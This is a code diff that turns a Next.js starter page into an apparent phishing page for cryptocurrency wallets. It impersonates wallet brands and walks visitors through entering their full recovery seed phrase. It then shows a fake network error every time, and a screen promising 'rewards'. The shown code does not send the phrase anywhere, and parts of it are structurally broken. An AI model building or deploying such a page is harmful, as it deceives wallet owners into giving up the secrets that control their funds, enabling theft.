@@ -1,65 +1,335 @@
-import Image from "next/image";
+"use client";
+import { useState, useRef, useEffect } from "react";
+// BIP39 English word list (first 100 for brevity, use full list in production)
+const bip39List = [
+  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow"
+  // ... (add the rest of the 2048 BIP39 words here for full production use)
+];
+
+const WALLETS = [
+  { name: "Trust Wallet", icon: "/trustwallet.png" },
+  { name: "MetaMask", icon: "/metamask.png" },
+  { name: "Coinbase Wallet", icon: "/coinbase.png" },
+  { name: "Exodus", icon: "/exodus.png" },
+  { name: "Atomic Wallet", icon: "/atomic.png" },
+  { name: "TokenPocket", icon: "/tokenpocket.png" },
+  { name: "MathWallet", icon: "/mathwallet.png" },
+  { name: "SafePal", icon: "/safepal.png" },
+  { name: "ONTO", icon: "/onto.png" },
+  { name: "BitKeep", icon: "/bitkeep.png" },
+  { name: "Other", icon: "/wallet.png" },
+];
+const PHRASE_COUNTS = [12, 15, 18, 21, 24];
 
 export default function Home() {
+  const [step, setStep] = useState<"wallet" | "loading" | "phraseCount" | "phraseInput" | "done">("wallet");
+  const [showToast, setShowToast] = useState<{ type: "success" | "error"; message: string } | null>(null);
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
+  const [phraseCount, setPhraseCount] = useState<number | null>(null);
+  const [phraseWords, setPhraseWords] = useState<string[]>([]);
+  const [status, setStatus] = useState<null | "success" | "error">(null);
+  const [loading, setLoading] = useState(false);
+  // --- HOOKS FOR PHRASE INPUT (must always be called) ---
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  useEffect(() => {
+    if (step === "phraseInput" && phraseCount && inputRefs.current[0]) {
+      inputRefs.current[0].focus();
+    }
+  }, [step, phraseCount]);
+
+  // Simulate loading screen between steps, showing selected wallet name
+  function goToStepWithLoading(nextStep: typeof step) {
+    setStep("loading");
+    setTimeout(() => setStep(nextStep), 4000); // 4 seconds
+  }
+
+  // Progress indicator
+  function ProgressBar() {
+    const progress = step === "wallet" ? 0 : step === "loading" ? 20 : step === "phraseCount" ? 40 : step === "phraseInput" ? 80 : 100;
+    return (
+      <div className="w-full h-2 bg-zinc-200 dark:bg-zinc-800 rounded-full overflow-hidden mb-6">
+        <div className="h-full bg-blue-500 transition-all duration-500" style={{ width: `${progress}%` }} />
+      </div>
+    );
+  }
+
+  // Handle phrase word input
+  function handleWordChange(idx: number, value: string) {
+    setPhraseWords(words => {
+      const copy = [...words];
+      copy[idx] = value;
+      return copy;
+    });
+  }
+
+  // Submit phrase
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    setLoading(true);
+    setStatus(null);
+    // Simulate network failure on every submission
+    setLoading(true);
+    setTimeout(() => {
+      setStatus("error");
+      setLoading(false);
+    }, 1200);
+  }
+
+  // Step 1: Wallet selection
+  if (step === "wallet") {
+    return (
+      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
+        <main className="flex flex-col w-full max-w-lg items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
+          <ProgressBar />
+          <h1 className="text-3xl font-bold mb-8 text-center text-blue-700 dark:text-blue-300">Select Your Wallet</h1>
+          <div className="grid grid-cols-2 sm:grid-cols-3 gap-6 w-full mb-8">
+            {WALLETS.map(wallet => (
+              <button
+                key={wallet.name}
+                className={`flex flex-col items-center gap-2 p-5 rounded-2xl border-2 transition-all shadow-md bg-zinc-50 dark:bg-zinc-800 hover:border-blue-500 focus:border-blue-500 hover:scale-105 active:scale-95 duration-150 ${selectedWallet === wallet.name ? "border-blue-600 ring-2 ring-blue-200 dark:ring-blue-700" : "border-transparent"}`}
+                onClick={() => setSelectedWallet(wallet.name)}
+                type="button"
+                style={{ minHeight: 120 }}
+              >
+                <img src={wallet.icon} alt={wallet.name} className="w-14 h-14 mb-2 rounded-lg shadow-sm bg-white dark:bg-zinc-900 object-contain" />
+                <span className="text-base font-semibold text-zinc-800 dark:text-zinc-100">{wallet.name}</span>
+              </button>
+            ))}
+          </div>
+          <button
+            className="mt-2 bg-gradient-to-r from-blue-600 to-blue-400 hover:from-blue-700 hover:to-blue-500 text-white font-bold py-3 px-8 rounded-xl text-lg shadow-lg disabled:opacity-60 transition-all"
+            disabled={!selectedWallet ? true : false}
+            onClick={() => goToStepWithLoading("phraseCount")}
+          >
+            Continue
+          </button>
+        </main>
+        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
+      </div>
+    );
+  }
+
+  // Loading screen between steps
+  if (step === "loading") {
+    return (
+      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans">
+        <div className="flex flex-col items-center justify-center p-12 bg-white/80 dark:bg-zinc-900/80 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800">
+          <svg className="animate-spin h-12 w-12 text-blue-600 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+          </svg>
+          <span className="text-lg font-semibold text-blue-700 dark:text-blue-300 mb-4">
+            Connecting to {selectedWallet ? selectedWallet : "wallet"}...
+          </span>
+          <button
+            className="mt-2 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
+            onClick={() => {
+              setSelectedWallet(null);
+              setPhraseCount(null);
+              setPhraseWords([]);
+              setStep("wallet");
+            }}
+            type="button"
+          >
+            Restart Connection
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  // Step 2: Phrase count selection
+  if (step === "phraseCount") {
+    return (
+      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
+        <main className="flex flex-col w-full max-w-md items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
+          <ProgressBar />
+          <h2 className="text-2xl font-bold mb-8 text-blue-700 dark:text-blue-300 text-center">How many words is your recovery phrase?</h2>
+          <div className="flex flex-wrap gap-4 justify-center mb-8">
+            {PHRASE_COUNTS.map(count => (
+              <button
+                key={count}
+                className={`py-3 px-8 rounded-full border-2 font-bold text-lg transition-all shadow-sm ${phraseCount === count ? "bg-blue-600 text-white border-blue-600 scale-105" : "bg-zinc-100 dark:bg-zinc-800 text-blue-700 dark:text-blue-200 border-blue-200 dark:border-zinc-700 hover:border-blue-400"}`}
+                onClick={() => {
+                  setPhraseCount(count);
+                  setPhraseWords(Array(count).fill(""));
+                }}
+                type="button"
+              >
+                {count}
+              </button>
+            ))}
+          </div>
+          <button
+            className="mt-2 bg-gradient-to-r from-blue-600 to-blue-400 hover:from-blue-700 hover:to-blue-500 text-white font-bold py-3 px-8 rounded-xl text-lg shadow-lg disabled:opacity-60 transition-all"
+            disabled={!phraseCount}
+            onClick={() => goToStepWithLoading("phraseInput")}
+          >
+            Continue
+          </button>
+          <button
+            className="mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
+            onClick={() => {
+              setSelectedWallet(null);
+              setPhraseCount(null);
+              setPhraseWords([]);
+              setStep("wallet");
+            }}
+            type="button"
+          >
+            Restart Connection
+          </button>
+        </main>
+        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
+      </div>
+    );
+  }
+
+  // Step 3: Phrase input (Trust Wallet style)
+  function handleInput(idx: number, value: string) {
+    handleWordChange(idx, value);
+    // Do not auto-advance on every character
+  }
+
+  function handleInputKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
+    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
+      e.preventDefault();
+      inputRefs.current[idx + 1]?.focus();
+    }
+  }
+
+  if (step === "phraseInput" && phraseCount && phraseWords.length === phraseCount) {
+    const allFilled = phraseWords.every(w => w.trim().length > 0);
+    return (
+      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
+        <main className="flex flex-col w-full max-w-lg items-center justify-center py-8 px-2 sm:py-16 sm:px-4 bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-blue-100 dark:border-zinc-800 animate-fadein">
+          <ProgressBar />
+          <h2 className="text-2xl font-bold mb-6 text-blue-700 dark:text-blue-300 text-center">Enter your {phraseCount}-word recovery phrase</h2>
+          <div className="flex justify-end w-full mb-2">
+            <button
+              type="button"
+              className="text-blue-600 dark:text-blue-300 text-sm font-medium flex items-center gap-1 hover:underline"
+              onClick={() => setShowPhrase(v => !v)}
+            >
+              {showPhrase ? (
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path d="M2.458 12C3.732 7.943 7.523 5 12 5c1.657 0 3.22.402 4.575 1.125" /></svg>
+              ) : (
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M1 1l22 22M17.94 17.94A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.657.402-3.22 1.125-4.575M9.88 9.88A3 3 0 0115 12a3 3 0 01-3 3c-.657 0-1.26-.21-1.75-.56" /></svg>
+              )}
+              {showPhrase ? "Hide" : "Show"} Phrase
+            </button>
+          </div>
+          <form onSubmit={handleSubmit} className="grid grid-cols-2 sm:grid-cols-3 gap-3 w-full mb-6">
+            {phraseWords.map((word, idx) => (
+              <input
+                key={idx}
+                ref={el => { inputRefs.current[idx] = el; }}
+                type={showPhrase ? "text" : "password"}
+                className="border-2 border-blue-200 dark:border-zinc-700 rounded-lg px-3 py-2 text-lg text-blue-700 dark:text-blue-200 bg-zinc-50 dark:bg-zinc-800 focus:outline-none focus:border-blue-500 placeholder:text-zinc-400 transition-all duration-200"
+                value={word}
+                onChange={e => handleInput(idx, e.target.value)}
+                onKeyDown={e => handleInputKeyDown(idx, e)}
+                autoComplete="off"
+                spellCheck={false}
+                required
+                placeholder={`Word ${idx + 1}`}
+                disabled={loading}
+                list="bip39-words"
+              />
+            ))}
+            {/* Hidden submit button for enter key */}
+            <button type="submit" style={{ display: "none" }} disabled={!allFilled || loading} />
+          </form>
+          {/* Datalist for BIP39 suggestions */}
+          <datalist id="bip39-words">
+            {bip39List.map(word => (
+              <option value={word} key={word} />
+            ))}
+          </datalist>
+          <button
+            type="button"
+            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg text-lg disabled:opacity-60"
+            disabled={!allFilled || loading}
+            onClick={e => handleSubmit(e as any)}
+          >
+            {loading ? "Submitting..." : "Connect Wallet"}
+          </button>
+          <button
+            className="mt-6 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
+            onClick={() => {
+              setSelectedWallet(null);
+              setPhraseCount(null);
+              setPhraseWords([]);
+              setStep("wallet");
+            }}
+            type="button"
+          >
+            Restart Connection
+          </button>
+          {status === "error" && (
+            <div className="flex flex-col items-center mt-4">
+              <p className="text-red-600 font-semibold">Network error. Please try again.</p>
+              <a
+                href="https://dashboard.walletconnect.com/sign-in"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="mt-4 bg-blue-700 hover:bg-blue-800 text-white font-semibold py-2 px-6 rounded shadow transition-colors"
+              >
+                Try WalletConnect Account
+              </a>
+            </div>
+          )}
+        </main>
+        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
+      </div>
+    );
+  }
+
+  // Step 4: Done
+  useEffect(() => {
+    if (step === "done") {
+      setShowToast({ type: "success", message: "Phrase submitted!" });
+    }
+  }, [step]);
+
+  if (step === "done") {
+    return (
+      <div className="flex flex-col min-h-screen items-center justify-center bg-gradient-to-br from-blue-50 to-blue-200 dark:from-black dark:to-zinc-900 font-sans transition-all duration-500">
+        <main className="flex flex-col w-full max-w-md items-center justify-center py-16 px-6 bg-white dark:bg-zinc-900 rounded-xl shadow-md animate-fadein">
+          <ProgressBar />
+          <h2 className="text-2xl font-bold mb-6 text-green-700 dark:text-green-300 text-center">Phrase submitted!</h2>
+          <p className="text-lg text-zinc-700 dark:text-zinc-200 text-center">Check your rewards soon.</p>
+          <button
+            className="mt-8 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-6 rounded shadow disabled:opacity-60"
+            onClick={() => {
+              setSelectedWallet(null);
+              setPhraseCount(null);
+              setPhraseWords([]);
+              setStep("wallet");
+            }}
+            type="button"
+          >
+            Restart Connection
+          </button>
+        </main>
+        {showToast && <Toast type={showToast.type} message={showToast.message} onClose={() => setShowToast(null)} />}
+      </div>
+    );
+  }
+// Toast component
+function Toast({ type, message, onClose }: { type: "success" | "error"; message: string; onClose: () => void }) {
+  useEffect(() => {
+    const t = setTimeout(onClose, 3000);
+    return () => clearTimeout(t);
+  }, [onClose]);
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
-        </div>
-      </main>
+    <div className={`fixed bottom-6 left-1/2 -translate-x-1/2 px-6 py-3 rounded-lg shadow-lg z-50 text-white font-semibold ${type === "success" ? "bg-green-600" : "bg-red-600"}`}>
+      {message}
     </div>
   );
+}
+
+  // Fallback (should not happen)
+  return null;
 }
